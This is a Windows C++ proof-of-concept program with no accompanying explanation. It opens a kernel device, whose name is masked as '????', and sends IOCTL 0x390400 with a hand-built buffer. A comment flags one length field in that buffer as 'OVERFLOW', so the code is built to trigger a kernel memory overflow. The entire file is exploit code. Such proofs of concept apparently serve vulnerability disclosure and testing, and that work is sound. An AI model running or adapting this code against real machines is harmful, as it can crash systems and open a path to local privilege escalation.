#pragma comment(lib, "ntdll")

#include <cstdio>
#include <windows.h>

int main() {
    HANDLE hCng = CreateFileA("\\\\.\\GLOBALROOT\\Device\\????",
        GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hCng == NULL) {
        printf("[-] Failed to open \\Device\\*: %u\n", GetLastError());
        return 1;
    }

    printf("[+] \\Device\\* opened, handle: %p\n", hCng);


    CONST DWORD DataBufferSize = 0x2AAB;
    CONST DWORD IoctlSize = 4096 + DataBufferSize;
    BYTE* IoctlData = (BYTE*)HeapAlloc(GetProcessHeap(), 0, IoctlSize);

    RtlZeroMemory(IoctlData, IoctlSize);

    *(DWORD*)&IoctlData[0x00] = 0x1A2B3C4D;
    *(DWORD*)&IoctlData[0x04] = 0x10400;
    *(DWORD*)&IoctlData[0x08] = 1;
    *(ULONGLONG*)&IoctlData[0x10] = 0x100;
    *(DWORD*)&IoctlData[0x18] = 3;
    *(ULONGLONG*)&IoctlData[0x20] = 0x200;
    *(ULONGLONG*)&IoctlData[0x28] = 0x300;
    *(ULONGLONG*)&IoctlData[0x30] = 0x400;
    *(DWORD*)&IoctlData[0x38] = 0;
    *(ULONGLONG*)&IoctlData[0x40] = 0x500;
    *(ULONGLONG*)&IoctlData[0x48] = 0x600;
    *(DWORD*)&IoctlData[0x50] = DataBufferSize; // OVERFLOW
    *(ULONGLONG*)&IoctlData[0x58] = 0x1000;
    *(ULONGLONG*)&IoctlData[0x60] = 0;
    RtlCopyMemory(&IoctlData[0x200], L"FUNCTION", 0x12);
    RtlCopyMemory(&IoctlData[0x400], L"PROPERTY", 0x12);

    ULONG_PTR OutputBuffer = 0;
    DWORD BytesReturned;
    BOOL Status = DeviceIoControl(
        hCng,
        0x390400,
        IoctlData,
        IoctlSize,
        &OutputBuffer,
        sizeof(OutputBuffer),
        &BytesReturned,
        NULL
    );

    printf("[+] Ioctl sent, Status: %d, OutputBuffer: %zx\n", Status, OutputBuffer);

    HeapFree(GetProcessHeap(), 0, IoctlData);
    CloseHandle(hCng);

    return 0;
}
